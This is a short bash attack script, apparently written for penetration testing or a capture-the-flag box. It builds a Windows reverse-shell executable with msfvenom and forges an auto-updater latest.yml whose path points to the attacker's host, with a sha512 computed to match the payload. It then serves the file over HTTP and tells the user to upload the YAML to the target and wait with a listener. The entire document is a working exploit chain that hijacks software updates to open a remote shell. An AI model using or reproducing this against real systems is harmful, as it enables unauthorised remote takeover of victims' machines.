#!/bin/bash
echo "You may need run the script as root or have extra permissions"
sleep 2
read -e -p "LHOST=" LHOST
read -e -p "LPORT=" LPORT
read -e -p "Choose name=" PAYLOAD

msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o $PAYLOAD

cat - <<EOF > latest.yml
version: 2.0.9
path: http://${LHOST}/${PAYLOAD}
sha512: $(sha512sum "${PAYLOAD}" | cut -d' ' -f1 | xxd -p -r | base64 -w0)
releaseDate: '$(date --utc +%FT%T.%3NZ)'
EOF

echo "Run your listener on the port $LPORT you specified"
sleep 2
echo "Upload latest.yml to the target and wait"
sleep 3
python3 -m http.server 80
